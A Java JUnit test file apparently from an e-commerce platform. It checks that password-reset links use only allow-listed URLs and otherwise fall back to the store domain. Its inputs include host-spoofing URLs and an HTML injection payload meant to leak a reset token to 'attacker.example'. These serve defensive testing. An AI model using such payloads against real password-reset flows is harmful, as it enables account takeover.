package com.salesmanager.test.shop.util;

import static org.junit.Assert.assertEquals;

import org.junit.Before;
import org.junit.Test;

import com.salesmanager.core.model.merchant.MerchantStore;
import com.salesmanager.shop.utils.FilePathUtils;

public class PasswordResetBaseUrlTest {

	private FilePathUtils filePathUtils;
	private MerchantStore store;

	@Before
	public void setUp() {
		filePathUtils = new FilePathUtils();
		filePathUtils.properties.setProperty(FilePathUtils.PASSWORD_RESET_ALLOWED_URLS,
				"https://shop.example.com, https://admin.example.com/portal/");
		store = new MerchantStore();
		store.setDomainName("store.example.com");
	}

	@Test
	public void allowListedUrlIsUsed() {
		assertEquals("https://shop.example.com/",
				filePathUtils.buildPasswordResetBaseUrl("https://shop.example.com/", store));
		assertEquals("https://admin.example.com/portal/",
				filePathUtils.buildPasswordResetBaseUrl("https://ADMIN.example.com/portal", store));
	}

	@Test
	public void unknownHostFallsBackToStoreDomain() {
		assertEquals("https://store.example.com/",
				filePathUtils.buildPasswordResetBaseUrl("https://attacker.example", store));
		assertEquals("https://store.example.com/",
				filePathUtils.buildPasswordResetBaseUrl("https://shop.example.com.attacker.example", store));
		assertEquals("https://store.example.com/",
				filePathUtils.buildPasswordResetBaseUrl("https://shop.example.com@attacker.example", store));
	}

	@Test
	public void markupInjectionFallsBackToStoreDomain() {
		assertEquals("https://store.example.com/",
				filePathUtils.buildPasswordResetBaseUrl("\"><img src=\"https://attacker.example/leak?t=", store));
		assertEquals("https://store.example.com/",
				filePathUtils.buildPasswordResetBaseUrl("https://shop.example.com/\"><img src=x>", store));
	}

	@Test
	public void missingReturnUrlUsesStoreDomain() {
		assertEquals("https://store.example.com/", filePathUtils.buildPasswordResetBaseUrl(null, store));
		store.setDomainName("http://store.example.com/");
		assertEquals("http://store.example.com/", filePathUtils.buildPasswordResetBaseUrl("", store));
	}
}
